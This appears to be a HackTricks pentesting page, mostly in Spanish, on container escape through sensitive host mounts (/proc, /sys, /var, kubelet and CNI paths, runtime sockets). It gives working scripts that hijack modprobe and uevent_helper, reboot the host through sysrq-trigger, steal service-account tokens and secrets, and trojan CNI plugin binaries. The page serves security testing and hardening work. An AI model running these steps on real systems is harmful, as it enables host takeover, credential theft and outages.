# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Los host mounts son una de las superficies prácticas más importantes para container-escape porque a menudo colapsan una vista de proceso cuidadosamente aislada de nuevo a visibilidad directa de los recursos del host. Los casos peligrosos no se limitan a `/`. Los bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, el estado gestionado por kubelet, o rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, filesystems de contenedores vecinos e interfaces de gestión del runtime.

Esta página existe por separado de las páginas de protección individuales porque el modelo de abuso es transversal. Un host mount escribible es peligroso en parte por mount namespaces, en parte por user namespaces, en parte por la cobertura de AppArmor o SELinux, y en parte por qué ruta exacta del host quedó expuesta. Tratarlo como su propio tema hace que la superficie de ataque sea mucho más fácil de razonar.

## `/proc` Exposure

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas proc inesperadas y escribibles puede, por tanto, llevar a disclosure de información, denial of service o ejecución directa de código en el host.

Las rutas de procfs de alto valor incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Empieza comprobando qué entradas de procfs de alto valor son visibles o escribibles:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque una serie de técnicas de host-execution requieren convertir una ruta dentro del container en la ruta correspondiente desde el punto de vista del host.

### Full Example: `modprobe` Helper Path Abuse

Si `/proc/sys/kernel/modprobe` es escribible desde el container y la ruta del helper se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El disparador exacto depende del objetivo y del comportamiento del kernel, pero lo importante es que una ruta helper escribible puede redirigir una futura invocación de kernel helper hacia contenido de host-path controlado por el atacante.

### Ejemplo completo: Recon del kernel con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar explotabilidad en lugar de escape inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a responder si la información de símbolos útil es visible, si mensajes recientes del kernel revelan estado interesante y qué características o mitigaciones del kernel están compiladas. El impacto normalmente no es un escape directo, pero puede acortar mucho el triage de vulnerabilidades del kernel.

### Full Example: SysRq Host Reboot

Si `/proc/sysrq-trigger` es escribible y alcanza la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es el reinicio inmediato del host. Este no es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que una simple divulgación de información.

## Exposición de `/sys`

sysfs expone grandes cantidades de estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar la ejecución de helpers, el comportamiento de los dispositivos, la configuración de security-module o el estado del firmware.

Las rutas de sysfs de alto valor incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas importan por distintas razones. `/sys/class/thermal` puede influir en el comportamiento de thermal-management y, por tanto, en la estabilidad del host en entornos mal expuestos. `/sys/kernel/vmcoreinfo` puede leak información de crash-dump y de la disposición del kernel que ayuda con fingerprinting de bajo nivel del host. `/sys/kernel/security` es la interfaz `securityfs` usada por Linux Security Modules, así que un acceso inesperado allí puede exponer o alterar estado relacionado con MAC. Las rutas de variables EFI pueden afectar la configuración de arranque respaldada por el firmware, lo que las hace mucho más serias que los archivos de configuración ordinarios. `debugfs` bajo `/sys/kernel/debug` es especialmente peligroso porque está pensado deliberadamente como una interfaz orientada a desarrolladores, con muchas menos expectativas de seguridad que las APIs del kernel endurecidas orientadas a producción.

Los comandos útiles de revisión para estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Lo que hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otro surface de LSM es visible de una forma que debería haber permanecido solo en el host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y es legible o escribible, espera un amplio surface orientado al kernel cuyo riesgo exacto depende de los nodos de debug habilitados.
- La exposición de variables EFI es menos común, pero si está presente tiene alto impacto porque toca ajustes respaldados por firmware en lugar de archivos normales en tiempo de ejecución.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host y la interacción con hardware, no para un neat shell-style escape.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente de host-fingerprinting y análisis de crash, útil para entender el estado de bajo nivel del kernel.

### Full Example: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede ejecutar un helper controlado por el atacante cuando se dispara un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de dentro del contenedor actual.

## `/var` Exposure

Montar `/var` del host dentro de un contenedor suele subestimarse porque no parece tan dramático como montar `/`. En la práctica puede ser suficiente para alcanzar runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens y neighboring application filesystems. En nodos modernos, `/var` suele ser donde realmente vive el estado de container más interesante desde el punto de vista operativo.

### Kubernetes Example

Un pod con `hostPath: /var` a menudo puede leer los projected tokens de otros pods y el contenido de overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque responden si el mount expone solo datos de aplicación poco sensibles o credenciales de clúster de alto impacto. Un token de service-account legible puede convertir inmediatamente la ejecución de código local en acceso a la Kubernetes API.

Si el token está presente, valida a qué puede acceder en lugar de detenerte en el descubrimiento del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso local al nodo. Un token con RBAC amplio puede convertir un `/var` montado en un compromiso de todo el clúster.

### Docker And containerd Example

En hosts Docker, los datos relevantes suelen estar en `/var/lib/docker`, mientras que en nodos Kubernetes respaldados por containerd pueden estar en `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenido de snapshot escribible de otra carga de trabajo, el atacante podría alterar archivos de la aplicación, colocar contenido web o cambiar scripts de inicio sin tocar la configuración actual del container.

Ideas concretas de abuso una vez que se encuentra contenido de snapshot escribible:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto de `/var` montado: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia workloads vecinos.

## Kubelet State, Plugins, And CNI Paths

Un montaje de `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` suele exponerse a través de privileged DaemonSets, agentes CNI, plugins CSI de nodo, operadores GPU y ayudantes de storage. Estos montajes son fáciles de descartar como "node plumbing", pero se sitúan directamente en la ruta de ejecución para nuevos pods y a menudo contienen credenciales de kubelet, secrets proyectados, sockets de registro y binarios ejecutables de plugins en el host.

Los objetivos de alto valor incluyen:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Los comandos útiles de revisión son:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por qué importan estas rutas:

- `/var/lib/kubelet/pki` puede exponer certificados de cliente de kubelet y otras credenciales locales del nodo que a veces se pueden reutilizar contra el API server o endpoints TLS accesibles por kubelet, según el diseño del cluster.
- `/var/lib/kubelet/pods` a menudo contiene tokens de service-account proyectados y Secrets montados para pods vecinos en el mismo nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` es principalmente una superficie de reconnaissance, pero muy útil: revela qué pods y containers poseen actualmente GPUs, hugepages, dispositivos SR-IOV y otros recursos escasos locales del nodo.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` y `/var/lib/kubelet/plugins_registry` revelan qué plugins CSI, DRA y de dispositivos están instalados y qué sockets se espera que el kubelet use. Si esos directorios son escribibles en lugar de solo legibles, el hallazgo se vuelve mucho más serio.
- `/opt/cni/bin` y `/etc/cni/net.d` están directamente en la ruta de configuración de la red del pod. El acceso de escritura allí suele ser un primitive de ejecución en host retrasada más que solo exposición de configuración.

### Full Example: Writable `/opt/cni/bin`

Si un directorio de binarios CNI del host está montado read-write, reemplazar un plugin puede ser suficiente para obtener ejecución en host la próxima vez que el kubelet cree un pod sandbox en ese nodo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Esto no es tan inmediato como un `docker.sock` montado, pero a menudo es más realista en pods comprometidos de infraestructura de Kubernetes. El punto importante es que el binario modificado luego es ejecutado por el flujo de configuración de la red del host, no por el contenedor actual.


## Runtime Sockets

Los mounts sensibles del host a menudo incluyen runtime sockets en lugar de directorios completos. Son tan importantes que merecen una repetición explícita aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vea [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para los flujos de explotación completos una vez que uno de estos sockets está montado.

Como patrón rápido de primera interacción:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, el camino desde "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corto que cualquier ruta de kernel breakout.

## Mount-Related CVEs

Los host mounts también se cruzan con vulnerabilidades del runtime. Ejemplos recientes importantes incluyen:

- `CVE-2024-21626` en `runc`, donde un descriptor de archivo de directorio filtrado podría colocar el directorio de trabajo en el sistema de archivos del host.
- `CVE-2024-23651`, `CVE-2024-23652` y `CVE-2024-23653` en BuildKit, donde Dockerfiles maliciosos, frontends y flujos `RUN --mount` podrían reintroducir acceso, borrado o privilegios elevados sobre archivos del host durante las builds.
- `CVE-2024-1753` en Buildah y Podman build flows, donde bind mounts elaborados durante la build podrían exponer `/` con lectura y escritura.
- `CVE-2025-47290` en `containerd` 2.1.0, donde una TOCTOU durante el unpack de una image podría permitir que una image especialmente elaborada modifique el sistema de archivos del host durante el pull.

Estas CVEs importan aquí porque muestran que el manejo de mounts no depende solo de la configuración del operador. El propio runtime también puede introducir condiciones de escape impulsadas por mounts.

## Checks

Usa estos comandos para localizar rápidamente las exposiciones de mounts de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Lo interesante aquí:

- Host root, `/proc`, `/sys`, `/var` y runtime sockets son hallazgos de alta prioridad.
- Las entradas writable de proc/sys a menudo significan que el mount está exponiendo controles kernel globales del host en lugar de una vista segura del container.
- Los paths montados de `/var` merecen revisión de credentials y de neighboring-workload, no solo revisión del filesystem.
- Los directorios de estado de Kubelet y los paths de CNI/plugin merecen la misma prioridad que los runtime sockets porque a menudo se encuentran directamente en la ruta de creación de pods y distribución de credentials del node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
